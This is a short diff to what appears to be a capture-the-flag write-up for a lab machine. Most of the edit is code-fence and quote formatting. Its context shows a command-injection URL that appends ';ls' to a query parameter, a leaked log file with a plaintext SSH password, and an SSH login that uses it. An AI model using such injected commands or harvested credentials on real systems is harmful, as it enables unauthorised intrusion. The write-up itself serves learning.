@@ -154,7 +154,7 @@ http://10.10.98.133/joomla/_test/?plot=;ls
 
 http://10.10.98.133/joomla/_test/log.txt
 
-
+```
 Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
 Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
 Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
@@ -163,10 +163,10 @@ Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49
 Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
 Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
 Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
+```sh
 
 
-
-basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
+> basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
 
 ```sh
 # ssh basterd@10.10.98.133 -p 55007
